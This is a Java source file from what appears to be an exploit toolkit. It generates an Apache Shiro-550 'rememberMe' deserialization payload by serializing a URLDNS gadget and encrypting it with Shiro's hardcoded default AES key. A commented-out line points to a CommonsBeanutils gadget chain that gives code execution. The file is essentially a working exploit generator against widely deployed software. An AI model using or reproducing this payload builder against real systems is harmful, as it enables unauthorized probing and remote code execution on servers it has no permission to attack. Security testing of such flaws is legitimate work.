package com.Jasetol.payloads;

import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.SerWithUnSer;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.util.Base64;

public class Shiro550 {
    public static byte[] getByte() throws Exception{
        //Object object = (PriorityQueue) CommonsBeanutils.getObject();
        Object object = URLDNS.getObject();
        byte[] bytes = SerWithUnSer.serialize(object);
        return bytes;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        byte[] plaintext = getByte();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        String payload = encryptAes(plaintext, key);
        System.out.println(payload);
    }

    public static String encryptAes(byte[] plaintext,byte[] key){
        AesCipherService aesCipherService = new AesCipherService();
        ByteSource encrypt = aesCipherService.encrypt(plaintext, key);
        return encrypt.toString();
    }
}
